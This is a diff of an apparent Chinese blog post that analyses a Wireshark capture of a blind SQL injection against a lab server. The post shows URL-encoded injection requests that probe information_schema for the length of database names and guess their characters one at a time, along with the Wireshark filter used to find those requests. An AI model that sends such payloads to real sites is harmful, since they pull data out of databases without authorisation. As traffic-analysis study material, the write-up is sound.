@@ -233,20 +233,18 @@
 <pre><code class="hljs http">http://172.16.80.11/index.php?act=news&amp;id=1%20and%20length((select%20SCHEMA_name%20from%20information_schema.SCHEMATA%20limit%204,1))&gt;3</code></pre>
 
 <p>schema5长度为4</p>
+<p>分析：</p>
+<pre><code class="hljs http">http://172.16.80.11/index.php?act=news&amp;id=1%20and%20length((select%20SCHEMA_name%20from%20information_schema.SCHEMATA%20limit%202,1))&gt;6</code></pre>
+
+<p>该语句的意思为在记录所有数据库信息的数据库中查找数据库的名字的长度<strong>&gt;6</strong>。此时为验证长度是否为<strong>7</strong>，过滤数据包：</p>
+<pre><code class="hljs perl">http.response_for.uri contains <span class="hljs-string">"length((select%20SCHEMA_name%20from%20information_schema.SCHEMATA%20limit%202,%201"</span></code></pre>
+
+<p>找到</p>
+<pre><code class="hljs http">http://172.16.80.11/index.php?act=news&amp;id=1%20and%20length((select%20SCHEMA_name%20from%20information_schema.SCHEMATA%20limit%202,1))&gt;7</code></pre>
+
+<p>返回的结果没有<strong>title</strong></p>
+<p>所以注入失败，说明该数据库名字长度为<strong>7</strong>。</p>
 </li>
-</ol>
-<p>   分析：</p>
-   <pre><code class="hljs http">http://172.16.80.11/index.php?act=news&amp;id=1%20and%20length((select%20SCHEMA_name%20from%20information_schema.SCHEMATA%20limit%202,1))&gt;6</code></pre>
-
-<p>   该语句的意思为在记录所有数据库信息的数据库中查找数据库的名字的长度<strong>&gt;6</strong>。此时为验证长度是否为<strong>7</strong>，过滤数据包：</p>
-   <pre><code class="hljs perl">http.response_for.uri contains <span class="hljs-string">"length((select%20SCHEMA_name%20from%20information_schema.SCHEMATA%20limit%202,%201"</span></code></pre>
-
-<p>   找到</p>
-   <pre><code class="hljs http">http://172.16.80.11/index.php?act=news&amp;id=1%20and%20length((select%20SCHEMA_name%20from%20information_schema.SCHEMATA%20limit%202,1))&gt;7</code></pre>
-
-<p>   返回的结果没有<strong>title</strong></p>
-<p>   所以注入失败，说明该数据库名字长度为<strong>7</strong>。</p>
-<ol start="3">
 <li><p><strong>爆破数据库名</strong></p>
 <p>如</p>
 <pre><code class="hljs http">http://172.16.80.11/index.php?act=news&amp;id=1%20and%20ascii(substr(((select%20SCHEMA_name%20from%20information_schema.SCHEMATA%20limit%202,1)),%201,%201))&gt;75</code></pre>
@@ -400,6 +398,12 @@
                 <div class="post-prevnext row">
                   <div class="post-prev col-6">
                     
+                    
+                      <a href="/2020/05/18/wireshark-file-upload/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">wireshark_file_upload</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
                     
                   </div>
                   <div class="post-next col-6">
